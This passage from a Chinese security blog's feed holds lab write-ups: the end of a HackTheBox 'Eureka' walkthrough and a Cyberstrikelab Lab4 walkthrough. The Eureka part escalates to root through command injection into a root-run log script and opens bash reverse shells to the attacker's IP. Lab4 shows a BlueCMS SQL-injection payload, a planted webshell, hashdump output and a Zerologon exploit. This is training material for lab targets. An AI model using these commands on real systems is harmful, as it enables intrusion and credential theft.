10.10.16.59:8081\n\nusername=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk\n```\n\n得到 `miranda` 的账号密码\n\n```bash\nusername=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve\n```\n\n`SSH` 登录\n\n```bash\n➜  Eureka ssh miranda-wise@10.10.11.66\nmiranda-wise@10.10.11.66's password: \nLast login: Sun Apr 27 12:40:29 2025 from 10.10.16.59\nmiranda-wise@eureka:~$ \n```\n\n拿到 user.txt\n\n```\ncat user.txt\n1c0182b3b229fff1f28a469053a94c36\n```\n\n## 提权\n\n### 信息收集\n\n使用了 Linpeas.sh 进行收集后，没找到什么有趣的信息\n\n```bash\n═══════════════════════════════╣ Basic information ╠═══════════════════════════════\n                               ╚═══════════════════╝\nOS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025\nUser & Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)\nHostname: eureka\n```\n\n### 脚本分析\n\n又回到之前的脚本处，想起来使用 `pspy64` 进行检测的时候还有另外一个脚本\n\n```bash\n2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log \n```\n\n是以 `root` 身份运行的，并且我们对 `/var/www/web/user-management-service` 目录有删除的权限，但是对 `application.log` 没有写的权限，但是我们可以删除了日志文件后再创建一个，我们就有写权限了，所以我们现在要找到脚本中是否存在命令注入\n\n```bash\n╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files\n  Group developers:\n/var/www/web    \n/var/www/web/user-management-service\n/var/www/web/user-management-service/target \n```\n\n分析脚本（喂给 `GPT`）\n\n```bash\n#!/bin/bash\n\n# 颜色定义，用于输出彩色信息\nGREEN='\\033[0;32m'      # 绿色，用于成功消息\nRED='\\033[0;31m'        # 红色，用于错误消息\nYELLOW='\\033[1;33m'     # 黄色，用于警告消息\nBLUE='\\033[0;34m'       # 蓝色，用于信息消息\nCYAN='\\033[0;36m'       # 青色，用于一般信息\nRESET='\\033[0m'         # 重置颜色，恢复默认颜色\n\n# 定义日志文件和输出文件\nLOG_FILE=\"$1\"           # 第一个参数为日志文件的路径\nOUTPUT_FILE=\"log_analysis.txt\"  # 输出文件，保存分析结果\n\n# 声明关联数组，用于存储登录计数\ndeclare -A successful_users  # 关联数组，存储成功登录的用户及其次数：用户名 -> 次数\ndeclare -A failed_users      # 关联数组，存储失败登录的用户及其次数：用户名 -> 次数\n\n# 定义初始的 HTTP 状态码及其计数（初始化为 0）\nSTATUS_CODES=(\"200:0\" \"201:0\" \"302:0\" \"400:0\" \"401:0\" \"403:0\" \"404:0\" \"500:0\")\n\n# 检查日志文件是否存在\nif [ ! -f \"$LOG_FILE\" ]; then\n    echo -e \"${RED}Error: Log file $LOG_FILE not found.${RESET}\"  # 如果文件不存在，输出错误信息\n    exit 1  # 脚本退出并返回错误码\nfi\n\n# 分析登录成功和失败的函数\nanalyze_logins() {\n    # 处理成功登录的记录\n    while IFS= read -r line; do\n        username=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # 从日志行中提取用户名\n        # 如果用户已经存在于数组中，则增加该用户的登录计数\n        if [ -n \"${successful_users[$username]+_}\" ]; then\n            successful_users[$username]=$((successful_users[$username] + 1))\n        else\n            successful_users[$username]=1  # 第一次登录，初始化计数为 1\n        fi\n    done < <(grep \"LoginSuccessLogger\" \"$LOG_FILE\")  # 过滤出包含 'LoginSuccessLogger' 的行\n\n    # 处理失败登录的记录\n    while IFS= read -r line; do\n        username=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # 从日志行中提取用户名\n        # 如果用户已经存在于数组中，则增加该用户的失败登录计数\n        if [ -n \"${failed_users[$username]+_}\" ]; then\n            failed_users[$username]=$((failed_users[$username] + 1))\n        else\n            failed_users[$username]=1  # 第一次失败，初始化计数为 1\n        fi\n    done < <(grep \"LoginFailureLogger\" \"$LOG_FILE\")  # 过滤出包含 'LoginFailureLogger' 的行\n}\n\n# 分析日志中的 HTTP 状态码\nanalyze_http_statuses() {\n    # 处理每一行日志，查找状态码\n    while IFS= read -r line; do\n        code=$(echo \"$line\" | grep -oP 'Status: \\K.*')  # 提取状态码\n        found=0\n        # 遍历 STATUS_CODES 数组，检查状态码是否存在\n        for i in \"${!STATUS_CODES[@]}\"; do\n            existing_entry=\"${STATUS_CODES[$i]}\"\n            existing_code=$(echo \"$existing_entry\" | cut -d':' -f1)  # 获取状态码\n            existing_count=$(echo \"$existing_entry\" | cut -d':' -f2)  # 获取当前计数\n            if [[ \"$existing_code\" -eq \"$code\" ]]; then\n                new_count=$((existing_count + 1))  # 如果状态码存在，增加计数\n                STATUS_CODES[$i]=\"${existing_code}:${new_count}\"\n                break\n            fi\n        done\n    done < <(grep \"HTTP.*Status: \" \"$LOG_FILE\")  # 过滤出包含 'Status: ' 的行\n}\n\n# 分析日志中的错误信息\nanalyze_log_errors(){\n    # 输出日志级别的统计信息\n    echo -e \"\\n${YELLOW}[+] Log Level Counts:${RESET}\"\n    log_levels=$(grep -oP '(?<=Z  )\\w+' \"$LOG_FILE\" | sort | uniq -c)  # 提取日志级别并排序统计\n    echo \"$log_levels\" | awk -v blue=\"$BLUE\" -v yellow=\"$YELLOW\" -v red=\"$RED\" -v reset=\"$RESET\" '{\n        if ($2 == \"INFO\") color=blue;       # INFO级别使用蓝色\n        else if ($2 == \"WARN\") color=yellow; # WARN级别使用黄色\n        else if ($2 == \"ERROR\") color=red;  # ERROR级别使用红色\n        else color=reset;                   # 其他日志级别恢复默认颜色\n        printf \"%s%6s %s%s\\n\", color, $1, $2, reset\n    }'\n\n    # 输出所有的错误消息\n    error_messages=$(grep ' ERROR ' \"$LOG_FILE\" | awk -F' ERROR ' '{print $2}')\n    echo -e \"\\n${RED}[+] ERROR Messages:${RESET}\"\n    echo \"$error_messages\" | awk -v red=\"$RED\" -v reset=\"$RESET\" '{print red $0 reset}'\n\n    # Eureka 服务连接失败的错误\n    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' \"$LOG_FILE\")\n    eureka_count=$(echo \"$eureka_errors\" | wc -l)  # 统计 Eureka 错误的数量\n    echo -e \"\\n${YELLOW}[+] Eureka Connection Failures:${RESET}\"\n    echo -e \"${YELLOW}Count: $eureka_count${RESET}\"  # 输出 Eureka 错误的数量\n    echo \"$eureka_errors\" | tail -n 2 | awk -v yellow=\"$YELLOW\" -v reset=\"$RESET\" '{print yellow $0 reset}'  # 输出最新的 Eureka 错误\n}\n\n# 显示最终的分析结果\ndisplay_results() {\n    echo -e \"${BLUE}----- Log Analysis Report -----${RESET}\"\n\n    # 输出成功登录统计信息\n    echo -e \"\\n${GREEN}[+] Successful Login Counts:${RESET}\"\n    total_success=0\n    for user in \"${!successful_users[@]}\"; do\n        count=${successful_users[$user]}\n        printf \"${GREEN}%6s %s${RESET}\\n\" \"$count\" \"$user\"  # 显示每个用户的成功登录次数\n        total_success=$((total_success + count))  # 累加成功登录总数\n    done\n    echo -e \"${GREEN}\\nTotal Successful Logins: $total_success${RESET}\"  # 显示成功登录总数\n\n    # 输出失败登录统计信息\n    echo -e \"\\n${RED}[+] Failed Login Attempts:${RESET}\"\n    total_failed=0\n    for user in \"${!failed_users[@]}\"; do\n        count=${failed_users[$user]}\n        printf \"${RED}%6s %s${RESET}\\n\" \"$count\" \"$user\"  # 显示每个用户的失败登录次数\n        total_failed=$((total_failed + count))  # 累加失败登录总数\n    done\n    echo -e \"${RED}\\nTotal Failed Login Attempts: $total_failed${RESET}\"  # 显示失败登录总数\n\n    # 输出 HTTP 状态码分布\n    echo -e \"\\n${CYAN}[+] HTTP Status Code Distribution:${RESET}\"\n    total_requests=0\n    # 按状态码进行排序\n    IFS=$'\\n' sorted=($(sort -n -t':' -k1 <<<\"${STATUS_CODES[*]}\"))\n    unset IFS\n    for entry in \"${sorted[@]}\"; do\n        code=$(echo \"$entry\" | cut -d':' -f1)  # 获取状态码\n        count=$(echo \"$entry\" | cut -d':' -f2)  # 获取该状态码的计数\n        total_requests=$((total_requests + count))  # 累加 HTTP 请求总数\n        \n        # 根据状态码的类型选择颜色\n        if [[ $code =~ ^2 ]]; then color=\"$GREEN\"   # 2xx 状态码使用绿色\n        elif [[ $code =~ ^3 ]]; then color=\"$YELLOW\" # 3xx 状态码使用黄色\n        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color=\"$RED\"  # 4xx 和 5xx 状态码使用红色\n        else color=\"$CYAN\"  # 其他状态码使用青色\n        fi\n        \n        printf \"${color}%6s %s${RESET}\\n\" \"$count\" \"$code\"  # 显示每个状态码及其计数\n    done\n    echo -e \"${CYAN}\\nTotal HTTP Requests Tracked: $total_requests${RESET}\"  # 显示 HTTP 请求总数\n}\n\n# 主执行过程\nanalyze_logins  # 调用分析登录函数\nanalyze_http_statuses  # 调用分析 HTTP 状态码函数\ndisplay_results | tee \"$OUTPUT_FILE\"  # 显示结果并保存到输出文件\nanalyze_log_errors | tee -a \"$OUTPUT_FILE\"  # 分析日志错误并追加到输出文件\necho -e \"\\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}\"  # 输出分析完成消息\n```\n\n然后发现一些可能存在命令注入的地方\n\n```bash\nusername=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # 从日志行中提取用户名\ncode=$(echo \"$line\" | grep -oP 'Status: \\K.*')\n```\n\n对这里进行测试\n\n```bash\n➜  Eureka echo \"$(echo 1 >> 1.txt)\" | grep -oP 'Status: \\K.*'\n\n➜  Eureka cat 1.txt\n\n1\n```\n\n### 命令注入\n\n在靶机上测试\n\n```bash\nrm -r /var/www/web/user-management-service/log/application.log\necho \"Status: $(echo 1 >> /home/miranda-wise/1.txt)\" > /var/www/web/user-management-service/log/application.log\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image6.png)\n\n成功，进行反弹 `shell`\n\n```bash\necho \"Status: $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.59/1234 0>&1')\" > /var/www/web/user-management-service/log/application.log\n```\n\n但是直接注入会以当前用户执行，所以我们需要对其进行改造\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image7.png)\n\n这样就不会直接执行，而是先写入到日志文件中\n\n```bash\necho 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.59/1234 0>&1)]' > /var/www/web/user-management-service/log/application.log\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image8.png)\n\n读取 `root.txt`\n\n```bash\ncat root.txt\n2a29dd1a4d1172b24ca76dd452035829\n```\n\n## 总结\n\n信息收集是真的很重要，对收集到信息去仔细分析，总是会找到有用的。\n",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka",
            "title": "HackTheBox - Machine - Eureka",
            "summary": "Machine Eureka https://app.hackthebox.com/machines/Eureka | Hard PS：尤里卡发动！所有奇观建造提速 30% ! 前期踩点 Web 渗透 信息收集 WhatWeb 页面上的一些操作要进行登陆后才能进行操作 抓个包分析一下框架 nginx...",
            "date_modified": "2025-04-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Linux靶机",
                "HackTheBox",
                "Spring",
                "Eureka",
                "命令注入"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4",
            "content_html": "\n# Lab4\n\n> https://www.cyberstrikelab.com/#/scene/detail/23\n> \n\n## Recon\n\n对目标主机进行扫描\n\n```php\n➜  Lab4 nmap -sT -min-rate 5000 -p- 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:31 CST\nNmap scan report for 192.168.10.10\nHost is up (0.051s latency).\nNot shown: 65520 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3306/tcp  open  mysql\n3389/tcp  open  ms-wbt-server\n5040/tcp  open  unknown\n5820/tcp  open  autopassdaemon\n7680/tcp  open  pando-pub\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n```\n\n```php\n➜  Lab4 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:32 CST\nNmap scan report for 192.168.10.10                                                              \nHost is up (0.055s latency).                                                                    \n                                                                                                \nPORT      STATE SERVICE       VERSION                                                                                                                                                           \n135/tcp   open  msrpc         Microsoft Windows RPC  \n445/tcp   open  microsoft-ds?\n3306/tcp  open  mysql         MySQL (unauthorized)       \n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-08-13T18:36:07+00:00; -7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=DESKTOP-JFB57A8\n| Not valid before: 2025-08-12T18:25:20\n|_Not valid after:  2026-02-11T18:25:20                                                         \n| rdp-ntlm-info:      \n|   Target_Name: DESKTOP-JFB57A8\n|   NetBIOS_Domain_Name: DESKTOP-JFB57A8      \n|   NetBIOS_Computer_Name: DESKTOP-JFB57A8\n|   DNS_Domain_Name: DESKTOP-JFB57A8\n|   DNS_Computer_Name: DESKTOP-JFB57A8\n|   Product_Version: 10.0.18362\n|_  System_Time: 2025-08-13T18:35:38+00:00\n5040/tcp  open  unknown\n5820/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n| http-cookie-flags:      \n|   /: \n|     PHPSESSID:                                                                                                                                                                                \n|_      httponly flag not set                                                                   \n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n|_http-title: \\xD1\\xDD\\xCA\\xBE\\xCD\\xF8\\xD5\\xBE - Powered by BlueCMS\n| http-robots.txt: 9 disallowed entries \n| /admin/ /api/ /data/ /include/ /install/ /templates/ \n|_/uc_client/ /user.php /comment.php\n7680/tcp  open  pando-pub?\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%), M\nicrosoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%\n)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -7h59m59s, deviation: 0s, median: -8h00m00s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-08-13T18:35:40\n|_  start_date: N/A\n```\n\n`5820` 是 `Web`服务\n\n## 192.168.10.10\n\n### BlueCMS\n\n搭建着的是 `BlueCMS`\n\n![image.png](/post-images/CyberstrikelabLab4/image.png)\n\n在页脚中能找到是：`Powered by BlueCMS v1.6`\n\n存在 `SQL`注入漏洞\n\n> https://www.cnblogs.com/Hi-blog/p/7990894.html#_label30\n> \n\n![image.png](/post-images/CyberstrikelabLab4/image1.png)\n\n拿用户密码\n\n```php\nad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin\n```\n\n![image.png](/post-images/CyberstrikelabLab4/image2.png)\n\n解出来密码是：`admin123456`\n\n### 后台 GetShell\n\n登录后台，在模版设置里面\n\n![image.png](/post-images/CyberstrikelabLab4/image3.png)\n\n> 利用链接：https://blog.csdn.net/weixin_72007549/article/details/127540398\n> \n\n在头部写上一句话木马，然后提交\n\n![image.png](/post-images/CyberstrikelabLab4/image4.png)\n\n蚁剑连接上\n\n![image.png](/post-images/CyberstrikelabLab4/image5.png)\n\n权限很高是 `system`权限\n\n![image.png](/post-images/CyberstrikelabLab4/image6.png)\n\n在根目录读到 `flag`\n\n```php\nC:\\> type flag.txt\ngo-flag{ovuRsBeMqji13Rrc}\n```\n\n这里用上 `CS` 了\n\n![image.png](/post-images/CyberstrikelabLab4/image7.png)\n\n### 信息收集\n\n抓一下 `HASH`\n\n```php\nbeacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\napache:1002:aad3b435b51404eeaad3b435b51404ee:0047605c0f2b9342a96ff4502f0f1a84:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:809f928153e9cdf27a043a18028a6efd:::\nweb:1001:aad3b435b51404eeaad3b435b51404ee:081dece85a94bf4a198aa49d8042347e:::\n```\n\n迁移到 `MSF`\n\n![image.png](/post-images/CyberstrikelabLab4/image8.png)\n\n查看网段信息\n\n```php\nInterface 16\n============\nName         : Realtek RTL8139C+ Fast Ethernet NIC #3\nHardware MAC : b0:5e:4f:ef:a4:d3\nMTU          : 1500\nIPv4 Address : 192.168.20.10\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::c8c0:3fc0:ab95:1f0a\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\nInterface 17\n============\nName         : Realtek RTL8139C+ Fast Ethernet NIC #2\nHardware MAC : 10:98:36:73:90:72\nMTU          : 1500\nIPv4 Address : 192.168.10.10\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::a898:1c84:d7f:2d59\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n```\n\n上传 `Fscan`扫描\n\n```php\nC:\\>fscan.exe -h 192.168.20.1-255 -nobr\nfscan.exe -h 192.168.20.1-255 -nobr\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| __/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-14 03:25:46] [INFO] 暴力破解线程数: 1\n[2025-08-14 03:25:46] [INFO] 开始信息扫描\n[2025-08-14 03:25:46] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255\n[2025-08-14 03:25:46] [INFO] 最终有效主机数量: 255\n[2025-08-14 03:25:46] [INFO] 开始主机扫描\n[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)\n[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)\n[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)\n[2025-08-14 03:25:49] [INFO] 存活主机数量: 3\n[2025-08-14 03:25:49] [INFO] 有效端口数量: 233\n[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.30:88\n[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.20:135\n[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.30:135\n[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.10:135\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:139\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.10:445\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.20:445\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.20:139\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:445\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:389\n[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.10:139\n[2025-08-14 03:25:53] [SUCCESS] 端口开放 192.168.20.10:3306\n[2025-08-14 03:25:54] [SUCCESS] 服务识别 192.168.20.30:88 =>\n[2025-08-14 03:25:55] [SUCCESS] 端口开放 192.168.20.20:7001\n[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]\n[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.10:445 =>\n[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.20:445 =>\n[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]\n[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.30:445 =>\n[2025-08-14 03:25:57] [SUCCESS] 服务识别 192.168.20.10:139 =>  Banner:[.]\n[2025-08-14 03:25:57] [SUCCESS] 端口开放 192.168.20.10:7680\n[2025-08-14 03:26:02] [SUCCESS] 服务识别 192.168.20.30:389 =>\n[2025-08-14 03:26:05] [SUCCESS] 服务识别 192.168.20.20:7001 => [http] 产品:Oracle WebLogic admin httpd\n[2025-08-14 03:26:10] [SUCCESS] 服务识别 192.168.20.10:3306 =>  Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed to connect to this MySQL server]\n[2025-08-14 03:26:52] [SUCCESS] 服务识别 192.168.20.10:7680 =>\n[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.20:135 =>\n[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.30:135 =>\n[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.10:135 =>\n[2025-08-14 03:26:55] [INFO] 存活端口数量: 14\n[2025-08-14 03:26:55] [INFO] 开始漏洞扫描\n[2025-08-14 03:26:55] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-14 03:26:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.10\n主机名: DESKTOP-JFB57A8\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.10.10\n[2025-08-14 03:26:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.20\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.20\n[2025-08-14 03:26:55] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-14 03:26:58] [SUCCESS] 网站标题 http://192.168.20.20:7001 状态码:404 长度:1164   标题:Error 404--Not Found\n[2025-08-14 03:26:58] [SUCCESS] 发现指纹 目标: http://192.168.20.20:7001 指纹: [weblogic]\n```\n\n## 192.168.20.20 - 1\n\n### Weblogic\n\n扫描出来 `Weblogic`\n\n用工具扫描一下\n\n```php\n➜  WeblogicScan git:(master) ✗ proxychains -q python WeblogicScan.py -u 192.168.20.20 -p 7001\n/root/Desktop/Tools/WeblogicScan/WeblogicScan.py:6: SyntaxWarning: invalid escape sequence '\\ '\n  |  _ \\ __ _| |__ | |__ (_) |_|  \\/  | __ _ ___| | __\n\n__        __   _     _             _        ____                  \n\\ \\      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  \n \\ \\ /\\ / / _ \\ '_ \\| |/ _ \\ / _` | |/ __| \\___ \\ / __/ _` | '_ \\ \n  \\ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |\n   \\_/\\_/ \\___|_.__/|_|\\___/ \\__, |_|\\___| |____/ \\___\\__,_|_| |_|\n                             |___/ \n                             By Tide_RabbitMask | V 1.5 \n\nWelcome To WeblogicScan !!!\nWhoami：https://github.com/rabbitmask\n[*] =========Task Start=========\n[+] [192.168.20.20:7001] Weblogic Version Is 12.2.1.4.0\n[+] [192.168.20.20:7001] Weblogic console address is exposed! The path is: http://192.168.20.20:7001/console/login/LoginForm.jsp\n[-] [192.168.20.20:7001] Weblogic UDDI module default path does not exist!\n[-] [192.168.20.20:7001] weblogic not detected CVE-2016-0638\n[-] [192.168.20.20:7001] weblogic not detected CVE-2016-3510\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-10271\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3248\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3506\n[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2628\n[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2893\n[+] [192.168.20.20:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2894\n[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2725\n[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2890\n[*] =========Task E n d=========\n```\n\n没有账户，没法打\n\n![image.png](/post-images/CyberstrikelabLab4/image9.png)\n\n## 192.168.20.30\n\n### 信息收集\n\n这里先打 `192.168.20.30`\n\n从上面扫描中能知道，这是 `DC` \n\n先尝试枚举一波\n\n```php\n➜  Tools proxychains nxc smb 192.168.20.30 -u anonymous -p ''\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:135  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) \n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\\anonymous: STATUS_LOGON_FAILURE \n```\n\n![image.png](/post-images/CyberstrikelabLab4/image10.png)\n\n并没有枚举出来什么\n\n### Zerologon\n\n这里再试试 `zerologon`\n\n```php\n➜  CVE-2020-1472-tester git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n================================================================\nSuccess! DC can be fully compromised by a Zerologon attack.\n```\n\n还真有，打 `exp`\n\n```php\n➜  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n==================================================\nTarget vulnerable, changing account password to empty string\n\nResult: 0\n\nExploit complete!\n```\n\nDumphash\n\n![image.png](/post-images/CyberstrikelabLab4/image11.png)\n\n`PTH` 拿 `flag3`\n\n![image.png](/post-images/CyberstrikelabLab4/image12.png)\n\n## 192.168.20.20 - 2\n\n从扫描结果看，`192.168.20.20`也是域内主机，也是直接 `PTH`\n\n![image.png](/post-images/CyberstrikelabLab4/image13.png)\n\n读 flag2\n\n```php\nC:\\Windows\\system32> type C:\\flag.txt\ngo-flag{yJzuQ09FXn0h7Em4}\n```",
            "url": "https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4",
            "title": "Cyberstrikelab - Lab4",
            "summary": "Lab4 https://www.cyberstrikelab.com/#/scene/detail/23 Recon 对目标主机进行扫描 5820 是 Web服务 192.168.10.10 BlueCMS 搭建着的是 BlueCMS 在页脚中能找到是：Powered by BlueCMS v1....",
            "date_modified": "2025-08-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Cyberstrikelab",
                "Windows",
                "blueCMS",
                "多层内网",
                "zerologon"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3",
            "content_html": "\n# Lab3\n\n> https://www.cyberstrikelab.com/#/scene/detail/22\n> \n\n## Recon\n\n提示 `192.168.10.0` 网段\n\n```php\n➜  Lab3 nmap -sn 192.168.10.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:42 CST\nNmap scan report for 192.168.10.10\nHost is up (0.053s latency).\nNmap scan report for 192.168.10.233\nHost is up (0.075s latency).\nNmap done: 256 IP addresses (2 hosts up) scanned in 18.25 seconds\n```\n\n扫描出来 `192.168.10.10`\n\n```php\n➜  Lab3 nmap -sT -min-rate 5000 -p- 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:43 CST\nNmap scan report for 192.168.10.10\nHost is up (0.050s latency).\nNot shown: 65522 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3306/tcp  open  mysql\n3590/tcp  open  wv-csp-sms\n5040/tcp  open  unknown\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  